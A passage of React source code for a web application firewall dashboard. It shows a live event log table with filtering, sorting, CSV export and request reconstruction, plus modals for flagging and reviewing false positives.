                </>
              )}
            </div>
          </div>
        </div>,
        document.body
      )}
    </motion.div>
  );
}

function LiveLogs({ onMarkFalsePositive }) {
  const [logs, setLogs] = useState([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [size, setSize] = useState(15);
  const [loading, setLoading] = useState(true);
  const [refreshInterval, setRefreshInterval] = useState(3000);
  const [liveUpdates, setLiveUpdates] = useState(true);

  useEffect(() => {
    getGeneralSettings().then(settings => {
      if (settings.logsPerPage) setSize(parseInt(settings.logsPerPage) || 15);
      if (settings.refreshInterval) {
        if (settings.refreshInterval === 'off') setRefreshInterval(0);
        else setRefreshInterval(parseInt(settings.refreshInterval) * 1000 || 5000);
      }
      if (settings.liveUpdates !== undefined) setLiveUpdates(settings.liveUpdates);
    }).catch(err => console.error("Failed to load general settings", err));
  }, []);
  const [search, setSearch] = useState('');
  const [severityFilter, setSeverityFilter] = useState('');
  const [attackFilter, setAttackFilter] = useState('');
  const [trafficTab, setTrafficTab] = useState('all');
  const [focusMode, setFocusMode] = useState(false);
  const [sortField, setSortField] = useState('timestamp');
  const [sortOrder, setSortOrder] = useState('desc');
  const [selectedLog, setSelectedLog] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [expandedLogs, setExpandedLogs] = useState(new Set());

  const toggleFocusMode = () => {
    setFocusMode(prev => {
      const next = !prev;
      // When enabling, clear the severity dropdown and let min_severity handle it
      if (next) setSeverityFilter('');
      return next;
    });
  };

  const handleExportReport = () => {
    if (!logs || logs.length === 0) {
      alert('No log data available to export. Please wait for data to load.');
      return;
    }
    // Build CSV from currently displayed (filtered) logs
    const headers = [
      'Transaction ID', 'Timestamp', 'Client IP', 'Country',
      'Method', 'URI', 'HTTP Code', 'Severity', 'Attack Type',
      'Rule ID', 'Message', 'Source ASN'
    ];
    const rows = logs.map(log => [
      log.id || '',
      log.timestamp || '',
      log.client_ip || '',
      log.country || 'Unknown',
      log.method || '',
      log.uri || '',
      log.http_code || '',
      log.severity || '',
      log.attack_type || '',
      log.rule_id || '',
      (log.message || '').replace(/"/g, '""'),  // escape quotes
      log.source_asn_org || ''
    ]);
    const csv = [
      headers.join(','),
      ...rows.map(r => r.map(v => `"${v}"`).join(','))
    ].join('\n');
    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    const dateStr = new Date().toISOString().split('T')[0];
    const tabLabel = trafficTab === 'all' ? 'all' : trafficTab === 'api' ? 'api' : 'web';
    a.download = `waf_events_${tabLabel}_${dateStr}.csv`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  };


  const toggleExpand = (id) => {
    setExpandedLogs(prev => {
      const newSet = new Set(prev);
      if (newSet.has(id)) {
        newSet.delete(id);
      } else {
        newSet.add(id);
      }
      return newSet;
    });
  };

  const getReconstructedCommand = (log) => {
    if (!log) return '-';
    const host = log?.raw_log?.transaction?.request?.headers?.Host || log?.hostname || log?.client_ip || 'localhost';
    const uri = log?.uri || '/';
    const ua = log?.raw_log?.transaction?.request?.headers?.['User-Agent'] || '';
    const method = log?.raw_log?.transaction?.request?.method || log?.method || 'GET';

    if (ua.toLowerCase().includes('curl')) {
      return `curl -i "http://${host}${uri}"`;
    } else {
      return `${method} http://${host}${uri}\nUser-Agent: ${ua || 'Unknown'}`;
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      setPage(1);
    }, 0);
    return () => clearTimeout(timer);
  }, [search, severityFilter, attackFilter, focusMode, trafficTab]);

  const fetchLogs = async () => {
    try {
      const filters = {};
      if (search.trim()) filters.search = search;
      if (focusMode) {
        filters.min_severity = 'High';
      } else if (severityFilter) {
        filters.severity = severityFilter;
      }
      if (attackFilter) filters.attack_type = attackFilter;
      if (trafficTab === 'web') filters.uri_type = 'web';
      else if (trafficTab === 'api') filters.uri_type = 'api';

      const logsData = await getLogs(page, size, filters);
      setLogs(logsData.data);
      setTotal(logsData.total);
    } catch (err) {
      console.error('Error fetching logs', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchLogs();
    }, 0);
    if (refreshInterval > 0 && liveUpdates) {
      const interval = setInterval(fetchLogs, refreshInterval);
      return () => {
        clearTimeout(timer);
        clearInterval(interval);
      };
    }
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [page, size, search, severityFilter, attackFilter, focusMode, trafficTab, refreshInterval, liveUpdates]);

  const handleSort = (field) => {
    if (sortField === field) {
      setSortOrder(sortOrder === 'asc' ? 'desc' : 'asc');
    } else {
      setSortField(field);
      setSortOrder('desc');
    }
  };

  const sortedLogs = [...logs]
    .filter(log => {
      if (trafficTab === 'web') return log.uri && !log.uri.startsWith('/api');
      if (trafficTab === 'api') return log.uri && log.uri.startsWith('/api');
      return true;
    })
    .sort((a, b) => {
      let valA = a[sortField] || '';
      let valB = b[sortField] || '';

      if (sortField === 'timestamp') {
        valA = Date.parse(valA) || 0;
        valB = Date.parse(valB) || 0;
      } else if (sortField === 'severity') {
        const severityOrder = { 'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1 };
        valA = severityOrder[valA] || 0;
        valB = severityOrder[valB] || 0;
      }

      if (valA < valB) return sortOrder === 'asc' ? -1 : 1;
      if (valA > valB) return sortOrder === 'asc' ? 1 : -1;
      return 0;
    });

  const totalPages = Math.ceil(total / size);

  const getSortIcon = (field) => {
    if (sortField !== field) return null;
    return sortOrder === 'asc' ? ' ▲' : ' ▼';
  };

  return (
    <motion.div
      className="glass-panel animate-fade-in" style={{ padding: '24px' }}
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
    >
      <div className="card-title" style={{ justifyContent: 'space-between', flexWrap: 'wrap', gap: '16px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <Activity size={20} color="#3b82f6" />
          <span>Real-Time CyberSentinel Engine Logs</span>
          <div className="pulse-container">
            <div className="pulse-dot"></div>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap', alignItems: 'center' }}>
          <div className="search-input-wrapper">
            <Search size={14} color="#a1a1aa" style={{ position: 'absolute', left: '12px' }} />
            <input
              type="text"
              placeholder="Search IP, URI, rule..."
              className="search-input"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
            />
          </div>

          {/* Severity dropdown: hidden when Focus Mode is active to prevent conflicting filter state */}
          {!focusMode && (
            <select
              className="filter-select"
              value={severityFilter}
              onChange={(e) => setSeverityFilter(e.target.value)}
            >
              <option value="">All Severities</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>
          )}

          <select
            className="filter-select"
            value={attackFilter}
            onChange={(e) => setAttackFilter(e.target.value)}
          >
            <option value="">All Threat Types</option>
            <option value="SQL Injection">SQL Injection</option>
            <option value="XSS">XSS</option>
            <option value="RCE">RCE</option>
            <option value="Protocol Violation">Protocol Violation</option>
            <option value="LFI/RFI">LFI/RFI</option>
            <option value="Scanner/Recon">Scanner/Recon</option>
            <option value="IP Reputation">IP Reputation</option>
            <option value="HTTP Method Abuse">HTTP Method Abuse</option>
            <option value="DoS/DDoS">DoS/DDoS</option>
            <option value="HTTP Smuggling">HTTP Smuggling</option>
            <option value="PHP Injection">PHP Injection</option>
            <option value="Code Injection">Code Injection</option>
            <option value="Session Fixation">Session Fixation</option>
            <option value="Java Injection">Java Injection</option>
            <option value="Anomaly Threshold Exceeded">Anomaly Threshold Exceeded</option>
            <option value="Unknown">Unknown</option>
          </select>

          {/* Focus Mode: one-click Critical + High only filter for SOC incident response */}
          <button
            onClick={toggleFocusMode}
            title={focusMode ? 'Disable Focus Mode — show all severities' : 'Enable Focus Mode — show Critical & High only'}
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              padding: '8px 14px',
              borderRadius: '8px',
              border: focusMode
                ? '1px solid rgba(239, 68, 68, 0.7)'
                : '1px solid rgba(161, 161, 170, 0.3)',
              background: focusMode
                ? 'linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(249, 115, 22, 0.15))'
                : 'rgba(255,255,255,0.04)',
              color: focusMode ? '#fca5a5' : '#a1a1aa',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
              transition: 'all 0.2s ease',
              boxShadow: focusMode ? '0 0 12px rgba(239, 68, 68, 0.25)' : 'none',
              whiteSpace: 'nowrap',
            }}
          >
            <span style={{ fontSize: '15px' }}>🎯</span>
            {focusMode ? 'Focus: Critical + High' : 'Focus Mode'}
          </button>

          {/* Export Report: downloads the currently-filtered logs as structured CSV */}
          <button
            onClick={handleExportReport}
            title="Export currently filtered events as a structured CSV report"
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              padding: '8px 14px',
              borderRadius: '8px',
              border: '1px solid rgba(16, 185, 129, 0.35)',
              background: 'rgba(16, 185, 129, 0.08)',
              color: '#6ee7b7',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
              transition: 'all 0.2s ease',
              whiteSpace: 'nowrap',
            }}
            onMouseEnter={e => {
              e.currentTarget.style.background = 'rgba(16,185,129,0.15)';
              e.currentTarget.style.borderColor = 'rgba(16,185,129,0.6)';
            }}
            onMouseLeave={e => {
              e.currentTarget.style.background = 'rgba(16,185,129,0.08)';
              e.currentTarget.style.borderColor = 'rgba(16,185,129,0.35)';
            }}
          >
            <FileText size={14} />
            Export Report
          </button>

        </div>
      </div>

      {/* WAF Stream Indicator — Fix 4: transparent banner explaining what this feed contains */}
      {focusMode && (
        <div style={{
          display: 'flex',
          alignItems: 'center',
          gap: '8px',
          marginTop: '12px',
          padding: '8px 14px',
          borderRadius: '8px',
          background: 'rgba(239, 68, 68, 0.07)',
          border: '1px solid rgba(239, 68, 68, 0.2)',
          fontSize: '12px',
          color: '#71717a',
          transition: 'all 0.3s ease',
        }}>
          <ShieldCheck size={13} color="#f87171" style={{ flexShrink: 0 }} />
          <span><strong style={{ color: '#fca5a5' }}>Focus Mode active</strong> · Showing Critical &amp; High severity events only · <span style={{ color: '#a1a1aa' }}>{total} event{total !== 1 ? 's' : ''} matched</span></span>
        </div>
      )}

      {/* ── Traffic Source Tabs (Premium Segmented Control) ── */}
      <div style={{
        display: 'inline-flex',
        alignItems: 'center',
        gap: '4px',
        marginTop: '16px',
        marginBottom: '16px',
        padding: '4px',
        background: 'rgba(0, 0, 0, 0.2)',
        border: '1px solid rgba(255, 255, 255, 0.05)',
        borderRadius: '12px',
        backdropFilter: 'blur(10px)',
      }}>
        {[
          {
            id: 'all',
            label: 'All Traffic',
            icon: Activity,
            color: '#a1a1aa',
            activeBg: 'rgba(161,161,170,0.15)',
            activeBorder: 'rgba(161,161,170,0.3)',
          },
          {
            id: 'api',
            label: 'API Traffic',
            icon: Code,
            color: '#f59e0b',
            activeBg: 'rgba(245,158,11,0.15)',
            activeBorder: 'rgba(245,158,11,0.3)',
          },
          {
            id: 'web',
            label: 'Web Application',
            icon: Globe,
            color: '#3b82f6',
            activeBg: 'rgba(59,130,246,0.15)',
            activeBorder: 'rgba(59,130,246,0.3)',
          },
        ].map(tab => {
          const isActive = trafficTab === tab.id;
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => { setTrafficTab(tab.id); setPage(1); }}
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                padding: '8px 16px',
                background: isActive ? tab.activeBg : 'transparent',
                border: `1px solid ${isActive ? tab.activeBorder : 'transparent'}`,
                borderRadius: '8px',
                cursor: 'pointer',
                color: isActive ? '#f4f4f5' : '#71717a',
                fontSize: '13px',
                fontWeight: isActive ? 600 : 500,
                transition: 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)',
                whiteSpace: 'nowrap',
                boxShadow: isActive ? `0 4px 12px ${tab.activeBg}` : 'none',
              }}
              onMouseEnter={(e) => {
                if (!isActive) {
                  e.currentTarget.style.color = '#a1a1aa';
                  e.currentTarget.style.background = 'rgba(255,255,255,0.02)';
                }
              }}
              onMouseLeave={(e) => {
                if (!isActive) {
                  e.currentTarget.style.color = '#71717a';
                  e.currentTarget.style.background = 'transparent';
                }
              }}
            >
              <Icon size={15} color={isActive ? tab.color : 'currentColor'} style={{ transition: 'all 0.2s ease' }} />
              <span>{tab.label}</span>
              {isActive && (
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  marginLeft: '4px',
                  padding: '2px 6px',
                  borderRadius: '6px',
                  background: 'rgba(0,0,0,0.3)',
                  border: `1px solid ${tab.activeBorder}`,
                  color: tab.color,
                  fontSize: '11px',
                  fontWeight: 700,
                  fontFamily: '"JetBrains Mono", monospace',
                  boxShadow: `inset 0 1px 2px rgba(0,0,0,0.5)`,
                }}>
                  {total.toLocaleString()}
                </div>
              )}
            </button>
          );
        })}
      </div>

        <div className="logs-table-wrapper" style={{ marginTop: '0', borderTopLeftRadius: '0', borderTopRightRadius: '0' }}>
          <table className="logs-table">
            <thead>
              <tr>
                <th onClick={() => handleSort('timestamp')} style={{ cursor: 'pointer', userSelect: 'none' }}>Time {getSortIcon('timestamp')}</th>
                <th onClick={() => handleSort('client_ip')} style={{ cursor: 'pointer', userSelect: 'none' }}>Source IP {getSortIcon('client_ip')}</th>
                <th onClick={() => handleSort('severity')} style={{ cursor: 'pointer', userSelect: 'none' }}>Severity {getSortIcon('severity')}</th>
                <th onClick={() => handleSort('attack_type')} style={{ cursor: 'pointer', userSelect: 'none' }}>Attack Type {getSortIcon('attack_type')}</th>
                <th onClick={() => handleSort('rule_id')} style={{ cursor: 'pointer', userSelect: 'none' }}>Rule ID {getSortIcon('rule_id')}</th>
                <th onClick={() => handleSort('http_code')} style={{ cursor: 'pointer', userSelect: 'none' }}>Status {getSortIcon('http_code')}</th>
                <th>Requested URI</th>
                <th style={{ textAlign: 'right' }}>Actions</th>
              </tr>
            </thead>
            <tbody>
                {loading && sortedLogs.length === 0 ? (
                  <tr>
                    <td colSpan="8" style={{ textAlign: 'center', padding: '60px', color: '#a1a1aa' }}>
                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '12px' }}>
                        <Activity className="animate-spin" size={20} /> Loading live CyberSentinel Engine logs...
                      </div>
                    </td>
                  </tr>
                ) : sortedLogs.length === 0 && search.trim() === '' ? (
                  <tr>
                    <td colSpan="8" style={{ padding: 0 }}>
                      <NoLogsEmptyState />
                    </td>
                  </tr>
                ) : sortedLogs.length === 0 ? (
                  <tr>
                    <td colSpan="8" style={{ padding: 0 }}>
                      <NoSearchResultsEmptyState 
                        searchTerm={search || severityFilter || attackFilter}
                        onClear={() => {
                          setSearch('');
                          setSeverityFilter('');
                          setAttackFilter('');
                        }}
                      />
                    </td>
                  </tr>
                ) : (
                  sortedLogs.map((log, index) => {
                    const rowId = log.id || index;
                    const reconstructedCommand = getReconstructedCommand(log);
                    const isNewLog = index === 0;

                    return (
                      <React.Fragment key={rowId}>
                        <tr
                          style={{
                            background: isNewLog ? 'rgba(0, 212, 255, 0.03)' : 'transparent',
                            borderLeft: isNewLog ? '3px solid var(--accent-color)' : 'none'
                          }}
                        >
                          <td style={{ color: '#a1a1aa', whiteSpace: 'nowrap' }}>{formatLocalTime(log?.timestamp)}</td>
                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent-color)', fontWeight: 600 }}>
                            <span style={{ marginRight: '6px' }} title={log?.severity}>
                              {log?.severity === 'Critical' ? '💀' : log?.severity === 'High' ? '🔥' : 'ℹ️'}
                            </span>
                            {log?.client_ip || '-'}
                          </td>
                          <td>
                            <span className={`severity-badge severity-${(log?.severity || 'low').toLowerCase()}`}>
                              {log?.severity || 'Low'}
                            </span>
                          </td>
                          <td style={{ fontWeight: 500 }}>{log?.attack_type || '-'}</td>
                          <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>{log?.rule_id || '-'}</td>
                          <td>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                              <div className="pulse-dot" style={{
                                width: '6px',
                                height: '6px',
                                backgroundColor: log?.http_code?.startsWith('2') ? 'var(--success-color)' : log?.http_code?.startsWith('3') ? 'var(--accent-color)' : 'var(--danger-color)',
                              }} />
                              <span style={{
                                color: log?.http_code?.startsWith('2') ? 'var(--success-color)' : log?.http_code?.startsWith('3') ? 'var(--accent-color)' : 'var(--danger-color)',
                                fontWeight: 700,
                                fontFamily: 'var(--font-mono)'
                              }}>
                                {log?.http_code || '-'}
                              </span>
                            </div>
                          </td>
                          <td className="payload-cell"
                            onClick={() => toggleExpand(rowId)}
                            style={{ fontFamily: 'monospace', fontSize: '12px', color: '#e2e8f0', maxBreakWidth: '300px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '300px' }}
                            title={reconstructedCommand}
                          >
                            {log?.uri || '-'}
                          </td>
                          <td style={{ textAlign: 'right' }}>
                            <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
                              {onMarkFalsePositive && (
                                <button
                                  className="action-btn-inspect"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    onMarkFalsePositive(log);
                                  }}
                                  style={{ borderColor: 'rgba(16, 185, 129, 0.4)', color: '#a7f3d0' }}
                                >
                                  Mark as FP
                                </button>
                              )}
                              <button
                                  className="action-btn-inspect"
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    setSelectedLog(log);
                                    setIsModalOpen(true);
                                  }}
                              >
                                Inspect Log
                              </button>
                            </div>
                          </td>
                        </tr>
                        {expandedLogs.has(rowId) && (
                          <tr className="expanded-log-row">
                            <td colSpan="8" style={{ padding: '16px 24px', background: 'rgba(59, 130, 246, 0.08)', borderBottom: '1px solid rgba(59, 130, 246, 0.2)' }}>
                              <div style={{ fontFamily: 'monospace', fontSize: '13px', color: '#93c5fd', wordBreak: 'break-all', whiteSpace: 'pre-wrap' }}>
                                <strong style={{ color: '#bfdbfe', marginRight: '8px' }}>RECONSTRUCTED COMMAND:</strong><br />
                                <span style={{ marginTop: '8px', display: 'block', padding: '12px', background: 'rgba(0,0,0,0.3)', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.05)' }}>
                                  {reconstructedCommand}
                                </span>
                              </div>
                            </td>
                          </tr>
                        )}
                      </React.Fragment>
                    );
                  })
                )}
            </tbody>
          </table>
        </div>

        {totalPages > 1 && (
          <div className="pagination-container">
            <button
              className="pagination-btn"
              disabled={page === 1}
              onClick={() => setPage(page - 1)}
            >
              <ChevronLeft size={16} /> Previous
            </button>
            <span className="pagination-info">
              Page <strong style={{ color: '#fff' }}>{page}</strong> of <strong style={{ color: '#fff' }}>{totalPages}</strong> ({total} total logs)
            </span>
            <button
              className="pagination-btn"
              disabled={page >= totalPages}
              onClick={() => setPage(page + 1)}
            >
              Next <ChevronRight size={16} />
            </button>
          </div>
        )}

        <LogDetailsModal
          isOpen={isModalOpen}
          log={selectedLog}
          onClose={() => {
            setIsModalOpen(false);
            setSelectedLog(null);
          }}
          onMarkFalsePositive={onMarkFalsePositive}
        />
    </motion.div>
  );
}

const CATEGORY_MAP = {
  "901": "Initialization",
  "905": "Common Exceptions",
  "911": "Method Enforcement",
  "913": "Scanner Detection",
  "920": "Protocol Enforcement",
  "921": "Protocol Attack",
  "922": "Multipart Attack",
  "930": "LFI",
  "931": "RFI",
  "932": "RCE",
  "933": "PHP Injection",
  "934": "Generic Attack",
  "941": "XSS",
  "942": "SQL Injection",
  "943": "Session Fixation",
  "944": "Java Injection",
  "949": "Blocking Evaluation",
  "950": "Data Leakage",
  "951": "SQL Leakage",
  "952": "Java Leakage",
  "953": "PHP Leakage",
  "954": "IIS Leakage",
  "955": "Web Shells",
  "956": "Ruby Leakage",
  "959": "Blocking Response",
  "980": "Correlation"
};

function FlagFpModal({ isOpen, log, onClose, onSubmit }) {
  const [note, setNote] = useState('');
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (isOpen) {
      const timer = setTimeout(() => setNote(''), 0);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  if (!isOpen || !log) return null;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    await onSubmit(log.id, note);
    setSubmitting(false);
    onClose();
  };

  return createPortal(
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '480px' }}>
        <div className="modal-header">
          <div className="modal-title">
            <ShieldCheck size={20} color="#10b981" />
            <span>Mark as False Positive</span>
          </div>
          <button className="modal-close-btn" onClick={onClose}>
            <X size={18} />
          </button>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
            <div style={{ background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '13px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                <span style={{ color: '#a1a1aa' }}>Rule ID:</span>
                <span style={{ fontFamily: 'monospace', color: '#fff' }}>{log.rule_id}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                <span style={{ color: '#a1a1aa' }}>Client IP:</span>
                <span style={{ fontFamily: 'monospace', color: '#3b82f6' }}>{log.client_ip}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                <span style={{ color: '#a1a1aa' }}>Request URI:</span>
                <span style={{ fontFamily: 'monospace', color: '#ef4444', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap', maxWidth: '240px' }}>{log.uri}</span>
              </div>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <label htmlFor="analyst-note" style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Analyst Justification Note</label>
              <textarea
                id="analyst-note"
                className="settings-input"
                style={{ height: '100px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '12px' }}
                placeholder="Explain why this request is legitimate (e.g. false alarm on search query parameter)..."
                value={note}
                onChange={(e) => setNote(e.target.value)}
                maxLength={400}
                required
              />
            </div>
          </div>
          <div className="modal-footer" style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
            <button type="button" className="modal-btn secondary" onClick={onClose}>Cancel</button>
            <button type="submit" className="modal-btn primary" disabled={submitting} style={{ background: '#10b981', borderColor: '#10b981', color: '#000', fontWeight: 600 }}>
              {submitting ? "Saving..." : "Confirm & Save"}
            </button>
          </div>
        </form>
      </div>
    </div>,
    document.body
  );
}

function FalsePositiveDetailsModal({ isOpen, entry, onClose, onUpdateStatus, onSaveNote, onCreateException, onDeleteEntry, userRole }) {
  const [noteVal, setNoteVal] = useState('');
  const [isEditingNote, setIsEditingNote] = useState(false);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (entry) {
      const timer = setTimeout(() => {
        setNoteVal(entry.analyst_note || '');
        setIsEditingNote(false);
      }, 0);
      return () => clearTimeout(timer);
    }
  }, [entry]);

  useEffect(() => {
    if (copied) {
      const t = setTimeout(() => setCopied(false), 2000);
      return () => clearTimeout(t);
    }
  }, [copied]);

  if (!isOpen || !entry) return null;

  const handleCopy = () => {
    const raw = entry.raw_log || entry;
    navigator.clipboard.writeText(JSON.stringify(raw, null, 2))
      .then(() => setCopied(true))
      .catch(err => console.error("Copy failed", err));
  };

  const handleSave = () => {
    onSaveNote(entry.id, noteVal);
    setIsEditingNote(false);
  };

  return createPortal(
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '620px' }}>
        <div className="modal-header">
          <div className="modal-title">
            <ShieldCheck size={20} color="#3b82f6" />
            <span>False Positive Report Details</span>
          </div>
          <button className="modal-close-btn" onClick={onClose}>
            <X size={18} />
          </button>
        </div>
        <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '16px', maxHeight: '75vh', overflowY: 'auto', paddingRight: '4px' }}>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.04)', fontSize: '13px' }}>
            <div>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Incident Rule ID:</span>
              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontFamily: 'monospace' }}>Rule #{entry.rule_id}</div>
            </div>
            <div>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Flagged Severity:</span>
              <div style={{ marginTop: '2px' }}>
                <span className={`severity-badge severity-${entry.severity?.toLowerCase() || 'medium'}`}>
                  {entry.severity}
                </span>
              </div>
            </div>
            <div style={{ marginTop: '8px' }}>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Source Client IP:</span>
              <div style={{ fontWeight: 600, color: '#38bdf8', marginTop: '2px', fontFamily: 'monospace' }}>{entry.client_ip}</div>
            </div>
            <div style={{ marginTop: '8px' }}>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Attack Type Category:</span>
              <div style={{ fontWeight: 600, color: '#eab308', marginTop: '2px' }}>{entry.attack_type}</div>
            </div>
            <div style={{ marginTop: '8px', gridColumn: 'span 2' }}>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Target Request URI:</span>
              <div style={{ fontWeight: 600, color: '#fff', marginTop: '2px', fontFamily: 'monospace', wordBreak: 'break-all' }}>{entry.uri}</div>
            </div>
            <div style={{ marginTop: '8px', gridColumn: 'span 2' }}>
              <span style={{ color: '#a1a1aa', fontSize: '12px' }}>Timestamp Reported:</span>
              <div style={{ fontWeight: 500, color: '#fff', marginTop: '2px' }}>{formatLocalTime(entry.timestamp)}</div>
            </div>
          </div>

          {/* Review Status Selector */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
            <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Triage Review Stage</span>
            <div style={{ display: 'flex', gap: '8px' }}>
              {['Pending', 'Reviewed', 'Resolved'].map((st) => (
                <button
                  key={st}
                  type="button"
                  onClick={() => onUpdateStatus(entry.id, st)}
                  style={{
                    flex: 1,
                    padding: '8px 12px',
                    borderRadius: '6px',
                    fontSize: '12px',
                    fontWeight: 600,
                    cursor: 'pointer',
                    transition: 'all 0.2s',
                    background: entry.status === st ? (st === 'Resolved' ? 'rgba(16,185,129,0.15)' : st === 'Reviewed' ? 'rgba(59,130,246,0.15)' : 'rgba(234,179,8,0.15)') : 'rgba(255,255,255,0.02)',
                    color: entry.status === st ? (st === 'Resolved' ? '#a7f3d0' : st === 'Reviewed' ? '#93c5fd' : '#fef08a') : '#a1a1aa',
                    border: entry.status === st ? (st === 'Resolved' ? '1px solid rgba(16,185,129,0.3)' : st === 'Reviewed' ? '1px solid rgba(59,130,246,0.3)' : '1px solid rgba(234,179,8,0.3)') : '1px solid rgba(255,255,255,0.05)',
                  }}
                >
                  {st}
                </button>
              ))}
            </div>
          </div>

          {/* Analyst Notes Field */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Analyst Justification Notes</span>
              {!isEditingNote && (
                <button
                  onClick={() => setIsEditingNote(true)}
                  style={{ background: 'transparent', border: 'none', color: '#3b82f6', fontSize: '11.5px', fontWeight: 600, cursor: 'pointer' }}
                >
                  Edit Note
                </button>
              )}
            </div>
            {isEditingNote ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <textarea
                  className="settings-input"
                  style={{ height: '80px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '10px', fontSize: '13px' }}
                  value={noteVal}
                  onChange={(e) => setNoteVal(e.target.value)}
                  placeholder="Describe why this request is a false positive..."
                />
                <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
                  <button className="modal-btn secondary" style={{ padding: '4px 10px', fontSize: '11px' }} onClick={() => { setNoteVal(entry.analyst_note || ''); setIsEditingNote(false); }}>Cancel</button>
                  <button className="modal-btn primary" style={{ padding: '4px 10px', fontSize: '11px', background: '#3b82f6', borderColor: '#3b82f6', color: '#fff' }} onClick={handleSave}>Save</button>
                </div>
              </div>
            ) : (
              <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: '6px', padding: '12px', fontSize: '13px', color: '#cbd5e1', fontStyle: entry.analyst_note ? 'normal' : 'italic', whiteSpace: 'pre-wrap' }}>
                {entry.analyst_note || "No analyst review notes recorded. Click 'Edit Note' to add details."}
              </div>
            )}
          </div>

          {/* Trigger Event Log JSON */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: '11px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase' }}>Origin Transaction Trigger Log JSON</span>
              <button
                onClick={handleCopy}
                style={{ background: 'transparent', border: 'none', color: copied ? '#10b981' : '#3b82f6', fontSize: '11px', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '4px', cursor: 'pointer' }}
              >
                {copied ? <Check size={12} /> : <Copy size={12} />}
                <span>{copied ? 'Copied JSON!' : 'Copy Raw JSON'}</span>
              </button>
            </div>
            <div style={{ maxHeight: '250px', overflowY: 'auto', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px' }}>
